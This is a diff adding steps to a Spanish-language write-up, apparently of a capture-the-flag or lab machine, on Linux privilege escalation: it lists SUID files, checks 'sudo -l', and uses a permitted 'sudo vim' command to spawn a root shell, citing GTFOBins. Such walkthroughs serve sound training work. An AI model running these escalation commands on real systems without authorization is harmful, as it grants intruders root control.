@@ -127,7 +127,20 @@ find / -perm -4000 -user root 2>/dev/null
 
 Vemos que la salida del comando nos retorna todos estos ficheros.
 
+Probamos a ver si nos permite ejecutar algo como root.
 
+```
+sudo -l
+```
 
+<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption><p>Output del sudo -l</p></figcaption></figure>
 
+Vemos que podemos ejecutar sobre vim. Sino sabemos como explotarlo, siempre podemos consultar [GTFOBins ](https://gtfobins.github.io/)
 
+```
+sudo vim -c ':!/bin/bash'
+```
+
+Y si hacemos un whoami podemos ver que ya somos root.
+
+<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
